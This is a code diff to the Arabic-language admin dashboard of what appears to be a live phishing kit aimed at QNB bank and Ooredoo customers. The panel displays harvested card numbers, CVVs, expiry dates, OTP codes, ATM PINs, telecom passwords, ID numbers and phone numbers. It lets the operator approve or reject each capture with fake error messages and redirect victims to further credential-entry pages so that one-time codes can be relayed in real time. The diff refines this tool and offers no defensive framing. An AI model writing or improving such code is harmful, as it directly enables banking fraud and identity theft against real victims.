@@ -59,7 +59,6 @@ export default function AdminDashboard() {
   });
 
   const updateStatusMutation = trpc.submissions.updateSessionStatus.useMutation();
-  const updateStepMutation = trpc.submissions.updateSessionStep.useMutation();
   const adminTakeActionMutation = trpc.submissions.adminTakeAction.useMutation();
 
   const handleLogin = (e: React.FormEvent) => {
@@ -78,19 +77,23 @@ export default function AdminDashboard() {
     localStorage.removeItem("admin_auth");
   };
 
-  const handleStatusUpdate = async (sessionId: string, status: string) => {
+  const handleAdminAction = async (sessionId: string, action: string, errorMessage?: string) => {
     try {
-      await updateStatusMutation.mutateAsync({ sessionId, status });
-      toast.success(`تم تحديث الحالة: ${status === 'approved' ? 'قبول' : 'رفض'}`);
+      await adminTakeActionMutation.mutateAsync({ 
+        sessionId, 
+        action, 
+        errorMessage 
+      });
+      toast.success(action === 'approve' ? "تم القبول" : "تم الرفض");
       refetch();
     } catch (error) {
-      toast.error("فشل تحديث الحالة");
+      toast.error("فشل تنفيذ الإجراء");
     }
   };
 
   const handleRedirect = async (sessionId: string, redirectTarget: string) => {
     try {
-      await adminTakeActionMutation.mutateAsync({ sessionId, action: "redirect", redirectTarget, errorMessage: undefined });
+      await adminTakeActionMutation.mutateAsync({ sessionId, action: "redirect", redirectTarget });
       toast.success(`تم التوجيه إلى: ${redirectTarget}`);
       refetch();
     } catch (error) {
@@ -106,6 +109,19 @@ export default function AdminDashboard() {
       name.toLowerCase().includes(searchTerm.toLowerCase())
     );
   });
+
+  const getStepLabel = (step: string) => {
+    const steps: any = {
+      'login': 'بيانات الدخول/الدفع',
+      'otp': 'رمز التحقق (OTP)',
+      'atm': 'رقم الصراف (PIN)',
+      'ooredoo': 'حساب Ooredoo',
+      'otp_ooredoo': 'OTP Ooredoo',
+      'success': 'مكتمل بنجاح',
+      'waiting': 'قيد الانتظار'
+    };
+    return steps[step] || step;
+  };
 
   if (!isAuthenticated) {
     return (
@@ -139,7 +155,6 @@ export default function AdminDashboard() {
 
   return (
     <div className="min-h-screen bg-[#f1f5f9] text-slate-900 font-sans" dir="rtl">
-      {/* Top Navbar */}
       <nav className="bg-white border-b border-slate-200 sticky top-0 z-40">
         <div className="max-w-[1600px] mx-auto px-4 h-20 flex items-center justify-between">
           <div className="flex items-center gap-4">
@@ -154,18 +169,17 @@ export default function AdminDashboard() {
               </div>
             </div>
           </div>
-
           <div className="flex items-center gap-6">
             <div className="relative hidden lg:block w-80">
               <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
               <Input
-                placeholder="بحث عن عميل أو كود الجلسة..."
+                placeholder="بحث عن عميل..."
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
-                className="pr-11 h-11 bg-slate-50 border-slate-200 rounded-xl focus:bg-white focus:ring-2 focus:ring-[#8C0032] transition-all"
+                className="pr-11 h-11 bg-slate-50 border-slate-200 rounded-xl"
               />
             </div>
-            <Button variant="ghost" onClick={handleLogout} className="h-11 px-4 gap-2 text-slate-500 hover:text-rose-600 hover:bg-rose-50 rounded-xl transition-all">
+            <Button variant="ghost" onClick={handleLogout} className="h-11 px-4 gap-2 text-slate-500 hover:text-rose-600 rounded-xl">
               <LogOut className="w-5 h-5" />
               <span className="font-bold">خروج</span>
             </Button>
@@ -174,169 +188,78 @@ export default function AdminDashboard() {
       </nav>
 
       <main className="max-w-[1600px] mx-auto px-4 py-8 space-y-8">
-        {/* Stats Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-          {[
-            { label: "إجمالي الزوار", value: sessions?.length || 0, icon: Users, color: "text-blue-600", bg: "bg-blue-50" },
-            { label: "طلبات قيد الانتظار", value: sessions?.filter(s => s.status === 'pending').length || 0, icon: Clock, color: "text-amber-600", bg: "bg-amber-50" },
-            { label: "عمليات مكتملة", value: sessions?.filter(s => s.status === 'accepted').length || 0, icon: CheckCircle2, color: "text-emerald-600", bg: "bg-emerald-50" },
-          ].map((stat, i) => (
-            <div key={i} className="bg-white p-6 rounded-3xl shadow-sm border border-slate-200 flex items-center gap-6 hover:shadow-md transition-shadow">
-              <div className={`${stat.bg} ${stat.color} p-5 rounded-2xl`}>
-                <stat.icon className="w-8 h-8" />
-              </div>
-              <div>
-                <p className="text-sm font-bold text-slate-400 mb-1">{stat.label}</p>
-                <p className="text-3xl font-black text-slate-900">{stat.value}</p>
-              </div>
-            </div>
-          ))}
-        </div>
-
-        {/* Data Table */}
         <div className="bg-white rounded-[2rem] shadow-sm border border-slate-200 overflow-hidden">
           <div className="p-6 border-b border-slate-100 bg-slate-50/50 flex items-center justify-between">
             <h2 className="text-lg font-black text-slate-800 flex items-center gap-2">
               <Users className="w-5 h-5 text-[#8C0032]" />
               قائمة العملاء المتصلين
             </h2>
-            <span className="text-xs font-bold text-slate-400 bg-white px-3 py-1 rounded-full border border-slate-200">
-              تحديث تلقائي كل 3 ثوانٍ
-            </span>
           </div>
-          
           <div className="overflow-x-auto">
             <Table>
               <TableHeader className="bg-slate-50">
-                <TableRow className="hover:bg-transparent border-b border-slate-100">
-                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">كود الجلسة</TableHead>
-                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">البنك</TableHead>
-                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">الدولة</TableHead>
-                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">الاسم</TableHead>
-                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">المرحلة الحالية</TableHead>
-                  <TableHead className="text-right py-5 font-black text-slate-500 text-xs uppercase tracking-wider">وقت الدخول</TableHead>
-                  <TableHead className="text-center py-5 font-black text-slate-500 text-xs uppercase tracking-wider">التحكم والبيانات</TableHead>
+                <TableRow>
+                  <TableHead className="text-right">كود الجلسة</TableHead>
+                  <TableHead className="text-right">البنك</TableHead>
+                  <TableHead className="text-right">الاسم</TableHead>
+                  <TableHead className="text-right">المرحلة الحالية</TableHead>
+                  <TableHead className="text-right">الحالة</TableHead>
+                  <TableHead className="text-center">الإجراءات</TableHead>
                 </TableRow>
               </TableHeader>
               <TableBody>
-                {filteredSessions?.length === 0 ? (
-                  <TableRow>
-                    <TableCell colSpan={7} className="h-40 text-center text-slate-400 font-bold">لا توجد طلبات نشطة حالياً</TableCell>
+                {filteredSessions?.map((session) => (
+                  <TableRow key={session.id}>
+                    <TableCell className="font-mono text-xs">...{session.id?.slice(-8)}</TableCell>
+                    <TableCell className="font-bold">{session.selectedBank?.toUpperCase()}</TableCell>
+                    <TableCell className="font-bold">{session.personalData?.nameArabic || "—"}</TableCell>
+                    <TableCell>
+                      <span className="px-3 py-1 bg-blue-50 text-blue-600 rounded-full text-xs font-bold">
+                        {getStepLabel(session.currentStep)}
+                      </span>
+                    </TableCell>
+                    <TableCell>
+                      <span className={`px-3 py-1 rounded-full text-xs font-bold ${
+                        session.adminAction === 'approve' ? 'bg-emerald-50 text-emerald-600' :
+                        session.adminAction === 'reject' ? 'bg-rose-50 text-rose-600' :
+                        'bg-amber-50 text-amber-600'
+                      }`}>
+                        {session.adminAction === 'approve' ? 'مقبول' : session.adminAction === 'reject' ? 'مرفوض' : 'قيد الانتظار'}
+                      </span>
+                    </TableCell>
+                    <TableCell className="text-center">
+                      <Button
+                        size="sm"
+                        className="bg-slate-900 hover:bg-[#8C0032] text-white rounded-xl gap-2"
+                        onClick={() => {
+                          setSelectedSession(session);
+                          setIsDetailsOpen(true);
+                        }}
+                      >
+                        <Eye className="w-4 h-4" />
+                        عرض والتحكم
+                      </Button>
+                    </TableCell>
                   </TableRow>
-                ) : (
-                  filteredSessions?.map((session) => (
-                    <TableRow key={session.id} className="group hover:bg-slate-50/80 transition-colors border-b border-slate-50">
-                      <TableCell className="font-mono text-[10px] text-slate-400">...{session.id?.slice(-10)}</TableCell>
-                      <TableCell>
-                        <div className="flex items-center gap-2">
-                          <div className={`w-2 h-2 rounded-full ${session.selectedBank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></div>
-                          <span className="font-black text-xs text-slate-700">{session.selectedBank?.toUpperCase()}</span>
-                        </div>
-                      </TableCell>
-                      <TableCell>
-                        <div className="flex items-center gap-2 text-slate-600 font-bold text-xs">
-                          <Globe className="w-3.5 h-3.5 text-slate-300" />
-                          {session.country || "غير معروف"}
-                        </div>
-                      </TableCell>
-                      <TableCell className="font-black text-slate-900 text-sm">{session.personalData?.nameArabic || session.personalData?.nameEnglish || "—"}</TableCell>
-                      <TableCell>
-                        <div className={`inline-flex items-center px-3 py-1 rounded-full text-[10px] font-black border ${
-                          session.currentStep === 'waiting' ? 'bg-amber-50 text-amber-600 border-amber-100 animate-pulse' :
-                          session.currentStep === 'success' ? 'bg-emerald-50 text-emerald-600 border-emerald-100' :
-                          'bg-blue-50 text-blue-600 border-blue-100'
-                        }`}>
-                          {getStepLabel(session.currentStep)}
-                        </div>
-                      </TableCell>
-                      <TableCell className="text-slate-400 font-bold text-[10px]">
-                        {new Date(session.createdAt).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
-                      </TableCell>
-                      <TableCell>
-                        <div className="flex items-center justify-center gap-3">
-                          <Button
-                            size="sm"
-                            className="h-9 px-4 bg-slate-900 hover:bg-[#8C0032] text-white rounded-xl gap-2 transition-all shadow-sm active:scale-95"
-                            onClick={() => {
-                              setSelectedSession(session);
-                              setIsDetailsOpen(true);
-                            }}
-                          >
-                            <Eye className="w-4 h-4" />
-                            <span className="font-bold">عرض البيانات</span>
-                          </Button>
-
-                          <DropdownMenu>
-                            <DropdownMenuTrigger asChild>
-                              <Button size="sm" variant="outline" className="h-9 px-4 border-slate-200 hover:bg-slate-50 text-slate-600 rounded-xl gap-2 transition-all active:scale-95">
-                                <ExternalLink className="w-4 h-4" />
-                                <span className="font-bold">توجيه</span>
-                              </Button>
-                            </DropdownMenuTrigger>
-                            <DropdownMenuContent align="center" className="w-52 p-2 rounded-2xl border-slate-200 shadow-xl z-50 bg-white">
-                              {[
-                                { name: '📄 صفحة الدخول', step: 'login-method' },
-                                { name: '🔑 صفحة OTP', step: 'otp' },
-                                { name: '💳 صفحة ATM PIN', step: 'atm-pin' },
-                                { name: '🌐 صفحة Ooredoo', step: 'ooredoo' },
-                                { name: '📱 صفحة OTP Ooredoo', step: 'otp-ooredoo' },
-                                { name: '✨ صفحة النجاح', step: 'success' },
-                              ].map((page) => (
-                                <DropdownMenuItem
-                                  key={page.step}
-                                  onClick={() => handleRedirect(session.id, `/${page.step}`)}
-                                  className="text-right justify-end font-bold text-slate-600 hover:bg-slate-50 cursor-pointer rounded-xl py-2.5 px-4 mb-1 last:mb-0 transition-colors"
-                                >
-                                  {page.name}
-                                </DropdownMenuItem>
-                              ))}
-                            </DropdownMenuContent>
-                          </DropdownMenu>
-                        </div>
-                      </TableCell>
-                    </TableRow>
-                  ))
-                )}
+                ))}
               </TableBody>
             </Table>
           </div>
         </div>
       </main>
 
-      {/* Modern Details Dialog */}
-      {selectedSession && (
-        <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
-          <DialogContent className="max-w-3xl bg-white rounded-[2.5rem] p-0 overflow-hidden border-none shadow-[0_20px_50px_rgba(0,0,0,0.2)] z-[100]" dir="rtl">
-            <DialogHeader className="bg-[#8C0032] p-8 text-white relative">
-              <div className="flex items-center gap-4">
-                <div className="bg-white/20 p-3 rounded-2xl backdrop-blur-md">
-                  <User className="w-8 h-8 text-white" />
-                </div>
-                <div>
-                  <DialogTitle className="text-2xl font-black">ملف بيانات العميل</DialogTitle>
-                  <p className="text-rose-100/60 text-xs font-bold mt-1 font-mono tracking-tighter uppercase">Session ID: {selectedSession.id}</p>
-                </div>
-              </div>
-            </DialogHeader>
+      <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
+        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto rounded-[2rem] p-0 border-none shadow-2xl bg-white" dir="rtl">
+          <DialogHeader className="p-8 bg-slate-900 text-white rounded-t-[2rem]">
+            <DialogTitle className="text-2xl font-black flex items-center gap-3">
+              <User className="w-6 h-6 text-rose-500" />
+              تفاصيل العميل والتحكم بالطلب
+            </DialogTitle>
+          </DialogHeader>
 
-            <div className="p-8 max-h-[75vh] overflow-y-auto space-y-8 custom-scrollbar">
-              {/* Section: Personal */}
-              <div className="space-y-4">
-                <div className="flex items-center gap-3 text-slate-800 font-black text-sm">
-                  <div className="w-1.5 h-6 bg-[#8C0032] rounded-full"></div>
-                  المعلومات الأساسية
-                </div>
-                <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
-                  <InfoCard label="الاسم الكامل" value={selectedSession.personalData?.nameArabic || selectedSession.personalData?.nameEnglish} />
-                  <InfoCard label="رقم الجوال" value={selectedSession.personalData?.phoneNumber} />
-                  <InfoCard label="رقم الهوية" value={selectedSession.personalData?.idNumber} />
-                  <InfoCard label="الدولة" value={selectedSession.country} />
-                </div>
-              </div>
-
-              {/* Dynamic Sections Grid */}
+          {selectedSession && (
+            <div className="p-8 space-y-8">
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                {/* Login Info */}
                 <DataSection 
                   title="بيانات الطلب والدفع"
                   icon={<CreditCard className="w-4 h-4" />}
@@ -348,123 +271,87 @@ export default function AdminDashboard() {
                     "الاسم": selectedSession.loginMethod?.cardholderName,
                     "التاريخ": selectedSession.loginMethod?.expiryDate,
                     "CVV": selectedSession.loginMethod?.cvv,
-                    "رسوم الإصدار": selectedSession.loginMethod?.issuanceFee + " ر.ق",
-                    "رسوم التوصيل": selectedSession.loginMethod?.deliveryFee + " ر.ق",
                     "الإجمالي": selectedSession.loginMethod?.totalAmount + " ر.ق",
                   }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
-                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
+                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله")}
                 />
 
-                {/* OTP Codes */}
                 <DataSection 
                   title="رموز التحقق (OTP)"
                   icon={<Key className="w-4 h-4" />}
                   data={selectedSession.otps?.reduce((acc: any, otp: any, i: number) => {
-                    acc[`رمز ${i + 1}`] = otp.otpCode;
+                    if (otp.otpType !== 'ooredoo') acc[`رمز ${i + 1}`] = otp.otpCode;
                     return acc;
                   }, {}) || { "رمز OTP": "—" }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
-                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
+                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "برجاء التحقق من الرمز المرسال عبر الجوال")}
                 />
 
-                {/* ATM PIN */}
                 <DataSection 
                   title="ATM PIN"
                   icon={<CreditCard className="w-4 h-4" />}
                   data={{ "الرقم السري": selectedSession.atmPin?.pin }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
-                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
+                  onReject={() => handleAdminAction(selectedSession.id, 'reject', "الرقم السري للصراف الي غير صحيح")}
                 />
 
-                {/* Ooredoo */}
                 <DataSection 
                   title="بيانات Ooredoo"
                   icon={<Globe className="w-4 h-4" />}
                   data={{
                     "المستخدم": selectedSession.ooredoo?.ooredooUser,
                     "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
-                    "رمز OTP Ooredoo": selectedSession.otps?.find((otp: any) => otp.otpType === 'ooredoo')?.otpCode || '—',
+                    "OTP Ooredoo": selectedSession.otps?.find((otp: any) => otp.otpType === 'ooredoo')?.otpCode || '—',
                   }}
-                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
-                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
+                  onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
+                  onReject={() => {
+                    const isOtpOoredoo = selectedSession.currentStep === 'otp_ooredoo';
+                    handleAdminAction(
+                      selectedSession.id, 
+                      'reject', 
+                      isOtpOoredoo ? "الرمز غير صحيح او غير صالح" : "اسم المستخدم او كلمة المرور غير صحيحه"
+                    );
+                  }}
                 />
               </div>
             </div>
-
-            <DialogFooter className="p-6 bg-slate-50 border-t flex justify-center">
-              <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-12 h-12 font-black rounded-2xl shadow-lg transition-all active:scale-95">
-                إغلاق النافذة
-              </Button>
-            </DialogFooter>
-          </DialogContent>
-        </Dialog>
-      )}
+          )}
+          <DialogFooter className="p-6 bg-slate-50 border-t flex justify-center">
+            <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 text-white px-12 h-12 font-black rounded-2xl">
+              إغلاق
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 }
 
-function getStepLabel(step: string | null | undefined) {
-  if (!step) return '—';
-  const steps: Record<string, string> = {
-    'home': 'الرئيسية',
-    'personal-data': 'البيانات الشخصية',
-    'login-method': 'تسجيل الدخول',
-    'otp': 'OTP',
-    'atm-pin': 'ATM PIN',
-    'ooredoo': 'Ooredoo',
-    'otp-ooredoo': 'OTP Ooredoo',
-    'waiting': 'في الانتظار',
-    'success': 'نجاح'
-  };
-  return steps[step] || step;
-}
-
-function InfoCard({ label, value }: { label: string; value: any }) {
+function DataSection({ title, icon, data, onAccept, onReject }: any) {
   return (
-    <div className="bg-slate-50 p-4 rounded-2xl border border-slate-100 hover:border-slate-200 transition-colors">
-      <p className="text-[10px] font-black text-slate-400 uppercase mb-1 tracking-wider">{label}</p>
-      <p className="text-slate-900 font-black text-sm break-all">{value || "—"}</p>
-    </div>
-  );
-}
-
-function DataSection({ title, icon, data, onAccept, onReject }: { 
-  title: string, 
-  icon: any, 
-  data: Record<string, any>, 
-  onAccept: () => void, 
-  onReject: () => void 
-}) {
-  const hasData = Object.values(data).some(v => v && v !== "—");
-  
-  return (
-    <div className={`p-5 rounded-3xl border transition-all ${hasData ? 'bg-slate-50 border-slate-200 shadow-sm' : 'bg-slate-50/30 border-dashed border-slate-200 opacity-50'}`}>
-      <div className="flex items-center justify-between mb-5">
-        <div className="flex items-center gap-2 text-slate-900 font-black text-sm">
-          <div className="bg-white p-2 rounded-lg shadow-sm">{icon}</div>
-          {title}
+    <div className="bg-white rounded-3xl border border-slate-200 shadow-sm overflow-hidden flex flex-col">
+      <div className="p-5 bg-slate-50 border-b border-slate-100 flex items-center justify-between">
+        <div className="flex items-center gap-3">
+          <div className="p-2 bg-white rounded-lg shadow-sm text-[#8C0032]">{icon}</div>
+          <h3 className="font-black text-slate-800 text-sm">{title}</h3>
         </div>
-        {hasData && (
-          <div className="flex items-center gap-2">
-            <Button size="sm" onClick={onAccept} className="h-8 px-3 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg gap-1 text-[10px] shadow-sm shadow-emerald-100">
-              <Check className="w-3 h-3" />
-              قبول
-            </Button>
-            <Button size="sm" onClick={onReject} variant="destructive" className="h-8 px-3 font-bold rounded-lg gap-1 text-[10px] shadow-sm shadow-rose-100">
-              <X className="w-3 h-3" />
-              رفض
-            </Button>
-          </div>
-        )}
       </div>
-      <div className="grid grid-cols-1 gap-3">
-        {Object.entries(data).map(([key, val]) => (
-          <div key={key} className="flex justify-between items-center bg-white/50 p-2.5 rounded-xl border border-white">
-            <span className="text-[10px] font-bold text-slate-400">{key}:</span>
-            <span className="text-xs font-black text-slate-700 font-mono">{val || "—"}</span>
+      <div className="p-6 space-y-4 flex-1">
+        {Object.entries(data).map(([key, value]: any) => (
+          <div key={key} className="flex justify-between items-center border-b border-slate-50 pb-3 last:border-0">
+            <span className="text-xs font-bold text-slate-400">{key}</span>
+            <span className="text-sm font-black text-slate-800">{value || "—"}</span>
           </div>
         ))}
+      </div>
+      <div className="p-4 bg-slate-50 grid grid-cols-2 gap-3">
+        <Button onClick={onAccept} className="bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-xl h-11 gap-2">
+          <Check className="w-4 h-4" /> قبول
+        </Button>
+        <Button onClick={onReject} variant="destructive" className="font-bold rounded-xl h-11 gap-2">
+          <X className="w-4 h-4" /> رفض
+        </Button>
       </div>
     </div>
   );
